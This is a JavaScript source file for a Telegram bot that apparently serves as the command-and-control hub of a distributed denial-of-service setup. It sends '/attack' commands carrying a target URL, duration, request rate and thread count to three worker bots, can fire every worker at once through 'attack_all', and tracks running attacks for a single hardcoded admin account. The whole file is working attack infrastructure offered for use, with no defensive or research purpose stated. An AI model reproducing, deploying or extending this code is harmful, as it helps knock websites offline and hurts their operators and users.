import { Telegraf } from 'telegraf';
import axios from 'axios';
import dotenv from 'dotenv';

dotenv.config();

const MASTER_TOKEN = process.env.MASTER_BOT_TOKEN;
const ADMIN_ID = '6247762383';

// Worker bot API URLs (Railway will provide these)
const WORKERS = [
    { name: 'worker1', url: process.env.WORKER1_URL, enabled: true, busy: false },
    { name: 'worker2', url: process.env.WORKER2_URL, enabled: true, busy: false },
    { name: 'worker3', url: process.env.WORKER3_URL, enabled: true, busy: false }
];

const bot = new Telegraf(MASTER_TOKEN);

// Track active attacks
const activeAttacks = new Map();

bot.start((ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;
    
    const available = WORKERS.filter(w => w.enabled && !w.busy).length;
    ctx.reply(
        `🔥 *MASTER CONTROL*\n\n` +
        `Workers: ${WORKERS.length}\n` +
        `Available: ${available}\n\n` +
        `*Commands:*\n` +
        `/attack <url> <time> <rate> <threads> - Auto-assign to worker\n` +
        `/attack_all <url> <time> <rate> <threads> - Use all workers\n` +
        `/status - Worker status\n` +
        `/enable <worker> - Enable worker\n` +
        `/disable <worker> - Disable worker`,
        { parse_mode: 'Markdown' }
    );
});

// Auto-assign to available worker
bot.command('attack', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;

    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /attack <url> <time> <rate> <threads>');
    }

    // Find available worker
    const worker = WORKERS.find(w => w.enabled && !w.busy);
    if (!worker) {
        return ctx.reply('⚠️ No workers available');
    }

    const attackId = Date.now().toString();
    worker.busy = true;

    ctx.reply(`🔄 Assigning to ${worker.name} (ID: ${attackId})`);

    try {
        // Send command to worker via Telegram API
        await axios.post(`https://api.telegram.org/bot${process.env[`WORKER${worker.name.slice(-1)}_TOKEN`]}/sendMessage`, {
            chat_id: ADMIN_ID,
            text: `/attack ${url} ${time} ${rate} ${threads} ${attackId}`
        });

        activeAttacks.set(attackId, {
            worker: worker.name,
            startTime: Date.now(),
            url
        });

        // Release worker after estimated time
        setTimeout(() => {
            worker.busy = false;
            activeAttacks.delete(attackId);
        }, (parseInt(time) + 10) * 1000);

    } catch (error) {
        worker.busy = false;
        ctx.reply(`❌ Failed: ${error.message}`);
    }
});

// Attack with ALL workers
bot.command('attack_all', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;

    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /attack_all <url> <time> <rate> <threads>');
    }

    const availableWorkers = WORKERS.filter(w => w.enabled && !w.busy);
    if (availableWorkers.length === 0) {
        return ctx.reply('⚠️ No workers available');
    }

    ctx.reply(`🚀 Launching attack on ${availableWorkers.length} workers`);

    let launched = 0;
    for (const worker of availableWorkers) {
        const attackId = Date.now().toString() + worker.name;
        worker.busy = true;

        try {
            await axios.post(`https://api.telegram.org/bot${process.env[`WORKER${worker.name.slice(-1)}_TOKEN`]}/sendMessage`, {
                chat_id: ADMIN_ID,
                text: `/attack ${url} ${time} ${rate} ${threads} ${attackId}`
            });

            activeAttacks.set(attackId, {
                worker: worker.name,
                startTime: Date.now(),
                url
            });

            launched++;
            
            // Small delay between workers
            await new Promise(r => setTimeout(r, 1000));

        } catch (error) {
            worker.busy = false;
            console.error(`Failed to launch ${worker.name}:`, error.message);
        }
    }

    ctx.reply(`✅ Launched ${launched} attacks`);
});

// Status command
bot.command('status', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;

    let status = '📊 *WORKER STATUS*\n\n';
    
    WORKERS.forEach(w => {
        const icon = w.enabled ? (w.busy ? '🟡' : '🟢') : '🔴';
        status += `${icon} *${w.name}*\n`;
        status += `  Status: ${w.busy ? 'Busy' : 'Ready'}\n`;
        status += `  URL: ${w.url || 'Not set'}\n\n`;
    });

    status += `Active Attacks: ${activeAttacks.size}`;
    ctx.reply(status, { parse_mode: 'Markdown' });
});

// Enable/disable workers
bot.command('enable', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;
    const workerName = ctx.message.text.split(' ')[1];
    const worker = WORKERS.find(w => w.name === workerName);
    if (worker) {
        worker.enabled = true;
        ctx.reply(`✅ ${workerName} enabled`);
    }
});

bot.command('disable', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return;
    const workerName = ctx.message.text.split(' ')[1];
    const worker = WORKERS.find(w => w.name === workerName);
    if (worker) {
        worker.enabled = false;
        worker.busy = false;
        ctx.reply(`🔴 ${workerName} disabled`);
    }
});

bot.launch();
